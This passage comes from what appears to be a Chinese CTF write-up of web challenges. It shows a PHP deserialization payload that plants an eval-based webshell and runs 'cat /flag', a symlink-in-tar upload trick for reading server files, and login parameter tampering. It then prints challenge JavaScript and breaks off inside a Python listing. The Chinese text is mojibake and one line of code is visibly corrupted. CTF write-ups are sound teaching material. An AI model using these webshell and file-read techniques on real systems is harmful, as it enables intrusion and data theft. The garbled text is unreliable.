<p>ï¼ˆ<strong>æ³¨æ„ï¼š</strong> å› ä¸ºç”¨äº†åŒå¼•å· <code>&quot;&quot;</code>ï¼ŒPHP ä¼šè®¤ä¸º <code>$_POST</code> æ˜¯å½“å‰è„šæœ¬çš„ä¸€ä¸ªå˜é‡ï¼Œä¼šå°è¯•<strong>ç«‹åˆ»è§£æå®ƒ</strong>ï¼Œå› ä¸ºå½“å‰è„šæœ¬é‡Œå¹¶æ²¡æœ‰ä¼ å‚ï¼Œ<code>$_POST[&#39;cmd&#39;]</code> æ˜¯ç©ºçš„ï¼Œæœ€ç»ˆç”Ÿæˆçš„å­—ç¬¦ä¸²å˜æˆäº†ï¼š<code>&lt;?php @eval();?&gt;</code> ï¼Œæ‰€ä»¥<strong>éœ€è¦\è¿›è¡Œè½¬ä¹‰</strong>ï¼ï¼‰</p>
<p>ç”Ÿæˆpayloadï¼š</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:10:&quot;FileLogger&quot;:2:&#123;s:7:&quot;logfile&quot;;s:9:&quot;shell.php&quot;;s:7:&quot;content&quot;;s:29:&quot;&lt;?php @eval($<span class="emphasis">_POST[&#x27;cmd&#x27;]);?&gt;&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>æ ¹æ®index.phpçš„æºç ï¼Œä¿®æ”¹payloadå¹¶åœ¨http:&#x2F;&#x2F;ç›®æ ‡IP:ç«¯å£&#x2F;index.phpé¡µé¢ä¼ å…¥POSTæ•°æ®ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shark=blueshark:O:10:&quot;FileLogger&quot;:2:&#123;s:7:&quot;logfile&quot;;s:9:&quot;shell.php&quot;;s:7:&quot;content&quot;;s:29:&quot;&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>è¿æ¥shellï¼Œè®¿é—®http:&#x2F;&#x2F;ç›®æ ‡IP:ç«¯å£&#x2F;shell.phpï¼Œè‹¥é¡µé¢ç©ºç™½åˆ™è¡¨ç¤ºæˆåŠŸï¼Œåœ¨postä¸­ä¼ å…¥ï¼šcmd&#x3D;system(â€˜cat &#x2F;flagâ€™);æ‹¿åˆ°flag</p>
</li>
</ol>
<hr>
<h1 id="7-flagï¼Ÿæˆ‘å°±å€Ÿèµ°äº†"><a href="#7-flagï¼Ÿæˆ‘å°±å€Ÿèµ°äº†" class="headerlink" title="7. flagï¼Ÿæˆ‘å°±å€Ÿèµ°äº†"></a>7. flagï¼Ÿæˆ‘å°±å€Ÿèµ°äº†</h1><p><strong>â€œæ”¯æŒä¸Šä¼ æ‰“åŒ…æ ¼å¼ï¼Œä¸Šä¼ åä¼šè‡ªåŠ¨å¸®ä½ è§£å‹åˆ°ç›®å½•â€</strong> ä¸”åç«¯æ˜¯ <strong>Python + Flask</strong></p>
<p>å°è¯•è½¯é“¾æ¥è¯»å–flag</p>
<p>é¦–å…ˆåœ¨æœ¬åœ°åˆ›å»ºä¸€ä¸ªæŒ‡å‘ <code>/flag</code> çš„å¿«æ·æ–¹å¼ï¼Œå†ç”¨ <code>tar</code> å‘½ä»¤æŠŠå®ƒæ‰“åŒ…ï¼ŒæœåŠ¡å™¨è§£å‹åï¼Œä¼šåœ¨ä¸Šä¼ ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ªæŒ‡å‘æœåŠ¡å™¨æ ¹ç›®å½•ä¸‹ <code>/flag</code> çš„å¿«æ·æ–¹å¼ã€‚</p>
<p>æ¯”å¦‚åœ¨kaliç»ˆç«¯æ‰§è¡Œï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s /flag flag.txt</span><br><span class="line">tar -cf flag.tar flag.txt</span><br></pre></td></tr></table></figure>

<p>ä¸Šä¼ åç‚¹å‡»flag.txtçš„å¿«æ·æ–¹å¼å³å¯</p>
<hr>
<h1 id="8-Who-am-I"><a href="#8-Who-am-I" class="headerlink" title="8. Who am I"></a>8. Who am I</h1><p>éšä¾¿æ³¨å†Œä¸ªè´¦å·ï¼Œåœ¨ç™»å½•æ—¶æŠ“åŒ…å‘ç°åœ¨POSTå¤šäº†ä¸€ä¸ªtype&#x3D;1</p>
<p>æ”¹æˆtype&#x3D;0åæ˜¯ä¸€ä¸ª302é¡µé¢ï¼Œå¯ä»¥è·³è½¬å»&#x2F;272e1739b89da32e983970ece1a086bd</p>
<p><img src="/img/isctf/0e4abe91-4a22-4583-b410-e38be13c473a.png" alt="p1"></p>
<p>è®¿é—®å‘ç°å¯ä»¥æŸ¥çœ‹é…ç½®æ–‡ä»¶</p>
<p>sontriex.a47b9c5f.jsï¼š</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&quot;/user/demo&quot;</span>,&#123;<span class="attr">method</span>:<span class="string">&quot;POST&quot;</span>&#125;)</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function"><span class="params">r</span> =&gt;</span> r.<span class="title function_">json</span>())</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;username&quot;</span>).<span class="property">innerText</span> = data.<span class="property">username</span>;</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>

<p>malniest.e19a0e13.jsï¼š</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="string">&quot;use strict&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">noop</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">identity</span>(<span class="params">x</span>) &#123; <span class="keyword">return</span> x; &#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">times</span>(<span class="params">n, fn</span>) &#123; <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; n; i++) <span class="title function_">fn</span>(i); &#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">clamp</span>(<span class="params">v, a, b</span>) &#123; <span class="keyword">return</span> <span class="title class_">Math</span>.<span class="title function_">min</span>(b, <span class="title class_">Math</span>.<span class="title function_">max</span>(a, v)); &#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">hashStr</span>(<span class="params">s</span>) &#123; <span class="keyword">let</span> h = <span class="number">0</span>; <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; s.<span class="property">length</span>; i++) h = (h &lt;&lt; <span class="number">5</span>) - h + s.<span class="title function_">charCodeAt</span>(i) | <span class="number">0</span>; <span class="keyword">return</span> h &gt;&gt;&gt; <span class="number">0</span>; &#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">randInt</span>(<span class="params">a, b</span>) &#123; <span class="keyword">return</span> a + <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * (b - a + <span class="number">1</span>)); &#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">pad2</span>(<span class="params">n</span>) &#123; <span class="keyword">return</span> n &lt; <span class="number">10</span> ? <span class="string">&quot;0&quot;</span> + n : <span class="string">&quot;&quot;</span> + n; &#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">dateStamp</span>(<span class="params"></span>) &#123; <span class="keyword">const</span> d = <span class="keyword">new</span> <span class="title class_">Date</span>(); <span class="keyword">return</span> d.<span class="title function_">getFullYear</span>()+<span class="string">&quot;-&quot;</span>+<span class="title function_">pad2</span>(d.<span class="title function_">getMonth</span>()+<span class="number">1</span>)+<span class="string">&quot;-&quot;</span>+<span class="title function_">pad2</span>(d.<span class="title function_">getDate</span>()); &#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">debounce</span>(<span class="params">fn, wait</span>) &#123; <span class="keyword">let</span> t; <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params"></span>) &#123; <span class="built_in">clearTimeout</span>(t); t = <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> fn.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>), wait); &#125;; &#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">throttle</span>(<span class="params">fn, wait</span>) &#123; <span class="keyword">let</span> last = <span class="number">0</span>; <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params"></span>) &#123; <span class="keyword">const</span> now = <span class="title class_">Date</span>.<span class="title function_">now</span>(); <span class="keyword">if</span> (now - last &gt;= wait) &#123; last = now; fn.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>); &#125; &#125;; &#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">memo</span>(<span class="params">fn</span>) &#123; <span class="keyword">const</span> m = <span class="keyword">new</span> <span class="title class_">Map</span>(); <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params">k</span>) &#123; <span class="keyword">if</span> (m.<span class="title function_">has</span>(k)) <span class="keyword">return</span> m.<span class="title function_">get</span>(k); <span class="keyword">const</span> v = <span class="title function_">fn</span>(k); m.<span class="title function_">set</span>(k, v); <span class="keyword">return</span> v; &#125;; &#125;</span><br><span class="line">  <span class="keyword">const</span> expensive = <span class="title function_">memo</span>(<span class="function"><span class="params">n</span> =&gt;</span> &#123; <span class="keyword">let</span> r = <span class="number">1</span>; <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; <span class="number">1000</span>; i++) r = (r * (n + i)) % <span class="number">2147483647</span>; <span class="keyword">return</span> r; &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">camel</span>(<span class="params">s</span>)&#123;<span class="keyword">return</span> s.<span class="title function_">replace</span>(<span class="regexp">/[-_](\w)/g</span>,<span class="function">(<span class="params">_,c</span>)=&gt;</span>c.<span class="title function_">toUpperCase</span>());&#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">chunk</span>(<span class="params">arr, size</span>)&#123;<span class="keyword">const</span> out=[];<span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;ia.<span class="title function_">concat</span>(b),[]);&#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">repeatStr</span>(<span class="params">s,n</span>)&#123;<span class="keyword">let</span> r=<span class="string">&quot;&quot;</span>;<span class="title function_">times</span>(n,<span class="function">()=&gt;</span>r+=s);<span class="keyword">return</span> r;&#125;</span><br><span class="line">  <span class="keyword">const</span> loremPool = <span class="string">&quot;lorem ipsum dolor sit amet consectetur adipiscing elit&quot;</span>.<span class="title function_">split</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">lorem</span>(<span class="params">n</span>)&#123;<span class="keyword">let</span> r=[];<span class="title function_">times</span>(n,<span class="function">()=&gt;</span>r.<span class="title function_">push</span>(loremPool[<span class="title function_">randInt</span>(<span class="number">0</span>,loremPool.<span class="property">length</span>-<span class="number">1</span>)]));<span class="keyword">return</span> r.<span class="title function_">join</span>(<span class="string">&quot; &quot;</span>);&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="title class_">Net</span> = &#123;</span><br><span class="line">    <span class="attr">get</span>: <span class="keyword">function</span>(<span class="params">url</span>)&#123; <span class="keyword">return</span> <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(&#123;url, <span class="attr">ok</span>: <span class="literal">true</span>, <span class="attr">ts</span>: <span class="title class_">Date</span>.<span class="title function_">now</span>()&#125;); &#125;,</span><br><span class="line">    <span class="attr">post</span>: <span class="keyword">function</span>(<span class="params">url, body</span>)&#123; <span class="keyword">return</span> <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(&#123;url, <span class="attr">ok</span>: <span class="literal">true</span>, <span class="attr">len</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(body||&#123;&#125;).<span class="property">length</span>&#125;); &#125;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="title class_">Bus</span> = (<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> map = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      <span class="attr">on</span>: <span class="function">(<span class="params">e,fn</span>)=&gt;</span>&#123; <span class="keyword">if</span>(!map.<span class="title function_">has</span>()) map.<span class="title function_">set</span>(e, []); map.<span class="title function_">get</span>(e).<span class="title function_">push</span>(fn); &#125;,</span><br><span class="line">      <span class="attr">emit</span>: <span class="function">(<span class="params">e,p</span>)=&gt;</span>&#123; <span class="keyword">const</span> arr = map.<span class="title function_">get</span>(e)||[]; arr.<span class="title function_">forEach</span>(<span class="function"><span class="params">fn</span>=&gt;</span>&#123; <span class="keyword">try</span>&#123;<span class="title function_">fn</span>(p);&#125;<span class="keyword">catch</span>(_)&#123;&#125; &#125;); &#125;,</span><br><span class="line">      <span class="attr">off</span>: <span class="function">(<span class="params">e,fn</span>)=&gt;</span>&#123; <span class="keyword">const</span> arr = map.<span class="title function_">get</span>(e)||[]; map.<span class="title function_">set</span>(e, arr.<span class="title function_">filter</span>(<span class="function"><span class="params">f</span>=&gt;</span>f!==fn)); &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;)();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="variable constant_">DOM</span> = &#123;</span><br><span class="line">    <span class="attr">qs</span>: <span class="function">(<span class="params">sel, root=<span class="variable language_">document</span></span>)=&gt;</span>root.<span class="title function_">querySelector</span>(sel),</span><br><span class="line">    <span class="attr">qsa</span>: <span class="function">(<span class="params">sel, root=<span class="variable language_">document</span></span>)=&gt;</span><span class="title class_">Array</span>.<span class="title function_">from</span>(root.<span class="title function_">querySelectorAll</span>(sel)),</span><br><span class="line">    <span class="attr">el</span>: <span class="function">(<span class="params">tag, props</span>)=&gt;</span><span class="title class_">Object</span>.<span class="title function_">assign</span>(<span class="variable language_">document</span>.<span class="title function_">createElement</span>(tag), props||&#123;&#125;),</span><br><span class="line">    <span class="attr">hide</span>: <span class="function">(<span class="params">node</span>)=&gt;</span>&#123; <span class="keyword">if</span>(node &amp;&amp; node.<span class="property">style</span>) node.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&quot;none&quot;</span>; &#125;,</span><br><span class="line">    <span class="attr">show</span>: <span class="function">(<span class="params">node</span>)=&gt;</span>&#123; <span class="keyword">if</span>(node &amp;&amp; node.<span class="property">style</span>) node.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&quot;&quot;</span>; &#125;,</span><br><span class="line">    <span class="attr">on</span>: <span class="function">(<span class="params">node, ev, fn, opt</span>)=&gt;</span>node &amp;&amp; node.<span class="title function_">addEventListener</span>(ev, fn, opt)</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">fakeLayoutScore</span>(<span class="params">node</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!node) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> r = node.<span class="property">getBoundingClientRect</span> ? node.<span class="title function_">getBoundingClientRect</span>() : &#123;<span class="attr">width</span>:<span class="number">1</span>,<span class="attr">height</span>:<span class="number">1</span>&#125;;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">clamp</span>(<span class="title class_">Math</span>.<span class="title function_">floor</span>((r.<span class="property">width</span> * r.<span class="property">height</span>) % <span class="number">9973</span>), <span class="number">0</span>, <span class="number">9973</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="variable constant_">CFG</span> = &#123;</span><br><span class="line">    <span class="attr">version</span>: <span class="string">&quot;v&quot;</span>+<span class="title function_">dateStamp</span>()+<span class="string">&quot;.&quot;</span>+<span class="title function_">randInt</span>(<span class="number">100</span>,<span class="number">999</span>),</span><br><span class="line">    <span class="attr">flags</span>: &#123; <span class="attr">featureX</span>: <span class="literal">false</span>, <span class="attr">featureY</span>: <span class="literal">true</span>, <span class="attr">verbose</span>: <span class="literal">false</span> &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">const</span> <span class="title class_">Cache</span> = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line"></span><br><span class="line">  (<span class="keyword">function</span> <span class="title function_">lightScheduler</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> tasks = [</span><br><span class="line">      <span class="function">()=&gt;</span><span class="title class_">Cache</span>.<span class="title function_">set</span>(<span class="string">&quot;k&quot;</span>+<span class="title function_">randInt</span>(<span class="number">1</span>,<span class="number">9</span>), <span class="title function_">hashStr</span>(<span class="title function_">lorem</span>(<span class="number">5</span>))),</span><br><span class="line">      <span class="function">()=&gt;</span><span class="title function_">expensive</span>(<span class="title function_">randInt</span>(<span class="number">1</span>,<span class="number">100</span>)),</span><br><span class="line">      <span class="function">()=&gt;</span><span class="title class_">Bus</span>.<span class="title function_">emit</span>(<span class="string">&quot;tick&quot;</span>, <span class="title class_">Date</span>.<span class="title function_">now</span>())</span><br><span class="line">    ];</span><br><span class="line">    <span class="keyword">let</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="keyword">function</span> <span class="title function_">run</span>(<span class="params"></span>)&#123;</span><br><span class="line">      <span class="keyword">try</span> &#123; tasks[i%tasks.<span class="property">length</span>](); &#125; <span class="keyword">catch</span>(_)&#123;&#125;</span><br><span class="line">      i++;</span><br><span class="line">      <span class="keyword">if</span>(i&lt;<span class="number">5</span>) <span class="built_in">setTimeout</span>(run, <span class="title function_">randInt</span>(<span class="number">60</span>,<span class="number">140</span>));</span><br><span class="line">    &#125;, <span class="title function_">randInt</span>(<span class="number">50</span>,<span class="number">120</span>));</span><br><span class="line">  &#125;)();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">ensureTypeHidden</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> form = <span class="variable constant_">DOM</span>.<span class="title function_">qs</span>(<span class="string">&quot;form[action=&#x27;/login&#x27;][method=&#x27;POST&#x27;]&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!form) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> hidden = form.<span class="title function_">querySelector</span>(<span class="string">&quot;input[name=&#x27;type&#x27;]&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!hidden) &#123;</span><br><span class="line">      hidden = <span class="variable constant_">DOM</span>.<span class="title function_">el</span>(<span class="string">&quot;input&quot;</span>, &#123; <span class="attr">type</span>: <span class="string">&quot;hidden&quot;</span>, <span class="attr">name</span>: <span class="string">&quot;type&quot;</span>, <span class="attr">value</span>: <span class="string">&quot;1&quot;</span> &#125;);</span><br><span class="line">      form.<span class="title function_">appendChild</span>(hidden);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable constant_">DOM</span>.<span class="title function_">on</span>(form, <span class="string">&quot;submit&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">let</span> h = form.<span class="title function_">querySelector</span>(<span class="string">&quot;input[name=&#x27;type&#x27;]&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> (!h) &#123;</span><br><span class="line">        h = <span class="variable constant_">DOM</span>.<span class="title function_">el</span>(<span class="string">&quot;input&quot;</span>, &#123; <span class="attr">type</span>: <span class="string">&quot;hidden&quot;</span>, <span class="attr">name</span>: <span class="string">&quot;type&quot;</span>, <span class="attr">value</span>: <span class="string">&quot;1&quot;</span> &#125;);</span><br><span class="line">        form.<span class="title function_">appendChild</span>(h);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (h.<span class="property">value</span> !== <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">        h.<span class="property">value</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">mountInvisible</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">      <span class="keyword">const</span> ghost = <span class="variable constant_">DOM</span>.<span class="title function_">el</span>(<span class="string">&quot;div&quot;</span>);</span><br><span class="line">      ghost.<span class="title function_">setAttribute</span>(<span class="string">&quot;data-h&quot;</span>, <span class="title function_">hashStr</span>(<span class="variable constant_">CFG</span>.<span class="property">version</span>));</span><br><span class="line">      ghost.<span class="property">style</span>.<span class="property">cssText</span> = <span class="string">&quot;display:none;width:0;height:0;overflow:hidden;&quot;</span>;</span><br><span class="line">      ghost.<span class="property">textContent</span> = <span class="title function_">repeatStr</span>(<span class="string">&quot;*&quot;</span>, <span class="title function_">randInt</span>(<span class="number">1</span>,<span class="number">3</span>)); </span><br><span class="line">      <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(ghost);</span><br><span class="line">    &#125;<span class="keyword">catch</span>(_)&#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">prewarm</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">      <span class="title class_">Net</span>.<span class="title function_">get</span>(<span class="string">&quot;/ping?_=&quot;</span>+<span class="title class_">Date</span>.<span class="title function_">now</span>()).<span class="title function_">then</span>(noop).<span class="title function_">catch</span>(noop);</span><br><span class="line">      <span class="title function_">times</span>(<span class="number">3</span>, <span class="function"><span class="params">i</span> =&gt;</span> <span class="title class_">Cache</span>.<span class="title function_">set</span>(<span class="string">&quot;warm&quot;</span>+i, <span class="title function_">expensive</span>(i+<span class="number">1</span>)));</span><br><span class="line">    &#125;<span class="keyword">catch</span>(_)&#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">keySpy</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> handler = <span class="title function_">throttle</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;  &#125;, <span class="number">200</span>);</span><br><span class="line">    <span class="variable constant_">DOM</span>.<span class="title function_">on</span>(<span class="variable language_">document</span>, <span class="string">&quot;keydown&quot;</span>, handler);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">init</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">prewarm</span>();</span><br><span class="line">    <span class="title function_">keySpy</span>();</span><br><span class="line">    <span class="title function_">ensureTypeHidden</span>();     </span><br><span class="line">    <span class="title function_">mountInvisible</span>();</span><br><span class="line">    <span class="title class_">Bus</span>.<span class="title function_">on</span>(<span class="string">&quot;tick&quot;</span>, noop);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="property">readyState</span> === <span class="string">&quot;loading&quot;</span>) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;DOMContentLoaded&quot;</span>, init, &#123; <span class="attr">once</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_">init</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>

<p>mian.pyï¼š</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span 